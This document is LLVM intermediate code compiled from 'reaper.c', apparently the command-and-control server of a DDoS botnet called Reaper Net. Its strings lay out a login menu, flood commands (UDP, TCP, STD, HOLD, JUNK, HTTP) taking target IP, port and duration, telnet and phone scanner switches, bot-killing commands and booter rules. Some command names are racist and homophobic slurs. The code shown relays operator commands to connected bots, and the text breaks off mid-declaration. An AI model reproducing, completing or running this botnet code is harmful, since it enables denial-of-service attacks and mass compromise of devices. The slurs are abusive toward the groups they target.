; ModuleID = 'reaper.c'
source_filename = "reaper.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[0;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"\0D\0A\1B[0;31m\1B[0;31m~~\1B[1;37m> \1B[0;31m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"!* GTFONIGGER\0A\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"!* GTFOFAG\0A\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"!* GTFODUP\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"!* DUPES\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"!* GTFOPUSSY\0A\00", align 1
@.str.11 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"!* PHONE ON\0A\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.17 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.19 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.22 = private unnamed_addr constant [51 x i8] c"%c]0; Bots: %d [+]@Flexingonlamers[+] Users: %d %c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.23 = private unnamed_addr constant [11 x i8] c"reaper.txt\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [50 x %struct.account] zeroinitializer, align 16
@.str.26 = private unnamed_addr constant [29 x i8] c"\1B[0;31mUsername:\1B[0;36m\1B[30m\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.28 = private unnamed_addr constant [35 x i8] c"\1B[0;36m*    Valid Login        *\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [24 x i8] c"\1B[0;31mPassword:\1B[0;36m\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.32 = private unnamed_addr constant [44 x i8] c"\1B[0;36***********************************\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [44 x i8] c"\1B[0;36*            Denied               *\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [18 x i8] c"\1B[0;31m8888888b\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [20 x i8] c"\1B[0;31m888   Y88b\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [20 x i8] c"\1B[0;31m888    888\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [63 x i8] c"\1B[0;31m888   d88P .d88b.   8888b.  88888b.   .d88b.  888d888\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [60 x i8] c"\1B[0;31m8888888P  d8P  Y8b      88b 888  88b d8P  Y8b 888P\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [59 x i8] c"\1B[0;31m888 T88b  88888888 .d888888 888  888 88888888 888\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [59 x i8] c"\1B[0;31m888  T88b Y8b.     888  888 888 d88P Y8b.     888\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [59 x i8] c"\1B[0;31m888   T88b  Y8888   Y888888 88888P     Y8888  888\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [41 x i8] c"\1B[0;31m                            888\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [43 x i8] c"\1B[0;31m                            888  \0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [10 x i8] c"\1B[0;31m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [55 x i8] c"\1B[0;31m*********************************************\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [69 x i8] c"\1B[0;31m*           \1B[1;37mWelcome To The Reaper           \1B[0;31m*\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [56 x i8] c"\1B[0;31m********************************************* \0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [27 x i8] c"\1B[0;31mSelect An Option:\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [60 x i8] c"\1B[0;37m[\1B[1;32mHELP\1B[0;37m] -\1B[1;37mShows Attack Commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [63 x i8] c"\1B[0;37m[\1B[1;33mRULES\1B[0;37m] -\1B[1;37mShow T.O.S Of ReaperNet\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [58 x i8] c"\1B[0;37m[\1B[0;34mPORTS\1B[0;37m] -\1B[1;37mShows Usable Ports\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [60 x i8] c"\1B[0;37m[\1B[0;35mSTRESS\1B[0;37m] -\1B[1;37mShows Boot Tutorial\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [65 x i8] c"\1B[0;37m[\1B[1;36mEXTRA\1B[0;37m] -\1B[1;37mShows Something For Skidz\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [40 x i8] c"\1B[1;37mLogged In As:\1B[0;31m %s\1B[0;37m\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [24 x i8] c"\1B[1;37m[root@Reaper ~]#\00", align 1
@.str.56 = private unnamed_addr constant [12 x i8] c"!* PHONE ON\00", align 1
@.str.57 = private unnamed_addr constant [24 x i8] c"PHONE SCANNER STARTED\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"!* PHONE OFF\00", align 1
@.str.59 = private unnamed_addr constant [24 x i8] c"PHONE SCANNER STOPPED\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.61 = private unnamed_addr constant [33 x i8] c"[+] Bots: %d [-] Users: %d [+]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [6 x i8] c"ABOUT\00", align 1
@.str.63 = private unnamed_addr constant [50 x i8] c"Reaper Serverside. ReCreated By FlexingOnLamers\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.65 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.66 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"Succesfully Sent A TCP FLOOD\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.70 = private unnamed_addr constant [31 x i8] c"Succesfully Sent A UDP FLOOD\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.72 = private unnamed_addr constant [25 x i8] c"STD Flood Sent to Skid\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.74 = private unnamed_addr constant [29 x i8] c"CNC Flooding Users Botnet!\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.76 = private unnamed_addr constant [40 x i8] c"Succesfully Sent A HTTP Reaper Flood!\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
@.str.78 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.80 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Attack Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [60 x i8] c"---------------------------------------------------------\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[1;32mUDP Flood\1B[1;37m]    !* UDP IP PORT TIME 32 0 1\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [69 x i8] c"\1B[1;37m[\1B[1;33mTCP Flood\1B[1;37m]    !* TCP IP PORT TIME 32 all 0 1\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[0;34mSTD Flood\1B[1;37m]    !* STD IP PORT TIME\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [59 x i8] c"\1B[1;37m[\1B[0;35mHOLD Flood\1B[1;37m]   !* HOLD IP PORT TIME\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [59 x i8] c"\1B[1;37m[\1B[1;36mJUNK Flood\1B[1;37m]   !* JUNK IP PORT TIME\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[0;31mHTTP Flood\1B[1;37m]   !* HTTP URL TIME\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Other Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [47 x i8] c"\1B[1;37m[\1B[1;32mClear Screen\1B[1;37m]    CLEAR\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [48 x i8] c"\1B[1;37m[\1B[1;33mLOGOUT\1B[1;37m]          LOGOUT\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [47 x i8] c"\1B[1;37m[\1B[0;34mUsable Ports\1B[1;37m]    PORTS\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [47 x i8] c"\1B[1;37m[\1B[0;35mRules\1B[1;37m]           RULES\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [50 x i8] c"\1B[1;37m[\1B[1;36mStop Attack\1B[1;37m]     KILLATTK\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"PORTS\00", align 1
@.str.97 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]PORTS\1B[1;37m[\1B[0;31m+\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [12 x i8] c"\1B[0;31m22\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [14 x i8] c"\1B[0;31m  23\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"\1B[0;31m    53\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [18 x i8] c"\1B[0;31m      80\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [21 x i8] c"\1B[0;31m        443\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [25 x i8] c"\1B[0;31m           1723\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [29 x i8] c"\1B[0;31m               3074\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [33 x i8] c"\1B[0;31m                   8080\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [6 x i8] c"RULES\00", align 1
@.str.107 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]RULES\1B[1;37m[\1B[0;31m+\1B[1;37m]\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [35 x i8] c"\1B[1;37m- \1B[1;32mNo Rapid Booting\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [35 x i8] c"\1B[1;37m- \1B[1;33mNo Sharing Users\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [37 x i8] c"\1B[1;37m- \1B[0;34mNo Going Over Time\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m- \1B[0;35mNo Using Scanner Commands\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"EXTRA\00", align 1
@.str.115 = private unnamed_addr constant [32 x i8] c"\1B[0;31mTHIS IS FOR THE SKIDZZ\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [23 x i8] c"\1B[0;31mMAX TIME=1000\0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [34 x i8] c"\1B[0;31mTHAT DONT MEAN SPAM 1000\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [63 x i8] c"\1B[0;31mIF SOMEONE IS PISSING YOU OFF JUST DO 100-600 SECONDS\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.120 = private unnamed_addr constant [51 x i8] c"Thank you for using the reaper! %s Cya Next Time\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [12 x i8] c"99999999999\00", align 1
@.str.122 = private unnamed_addr constant [45 x i8] c"ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [9 x i8] c"TIME.log\00", align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.125 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.126 = private unnamed_addr constant [28 x i8] c"ATTEMPT TO KILL BOTS BY %s\0A\00", align 1
@.str.127 = private unnamed_addr constant [9 x i8] c"KILL.log\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.129 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.130 = private unnamed_addr constant [33 x i8] c"ATTEMPT TO KILL YOUR BOTS BY %s\0A\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"BOTKILLER.log\00", align 1
@.str.132 = private unnamed_addr constant [26 x i8] c"ATTEMPT TO STEAL BOTS %s\0A\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"dup\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"SMALLBOTKILLER.log\00", align 1
@.str.135 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.136 = private unnamed_addr constant [11 x i8] c"report.log\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.138 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.139 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.140 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.141 = private unnamed_addr constant [33 x i8] c"\1B[32mReaper Net ,\1B[33m Remade, \0A\00", align 1
@.str.142 = private unnamed_addr constant [68 x i8] c"\1B[1;35mBY @FLEXINGONLAMERS \1B[0;31mReaper \1B[35mNet \1B[36mSreened\1B[0m\0A\00", align 1
@.str.143 = private unnamed_addr constant [9 x i8] c"bots.txt\00", align 1
@.str.144 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.145 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.147 = private unnamed_addr constant [6 x i8] c"PURGE\00", align 1
@.str.148 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.149 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.150 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.151 = private unnamed_addr constant [27 x i8] c"STOP USING RELIVANT PORTS\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %102, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %105

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 2
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %102

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = load i8*, i8** %4, align 8
  %83 = load i8*, i8** %4, align 8
  %84 = call i64 @strlen(i8* %83) #8
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
  %86 = load i32, i32* %7, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %98

88:                                               ; preds = %80
  %89 = load i32, i32* %12, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %90
  %92 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %88
  %96 = load i32, i32* %12, align 4
  %97 = call i64 @send(i32 %96, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0), i64 13, i32 16384)
  br label %101

98:                                               ; preds = %88, %80
  %99 = load i32, i32* %12, align 4
  %100 = call i64 @send(i32 %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384)
  br label %101

101:                                              ; preds = %98, %95
  br label %102

102:                                              ; preds = %101, %59
  %103 = load i32, i32* %12, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %12, align 4
  br label %35, !llvm.loop !11

105:                                              ; preds = %35
  %106 = load i8*, i8** %8, align 8
  call void @free(i8* %106) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
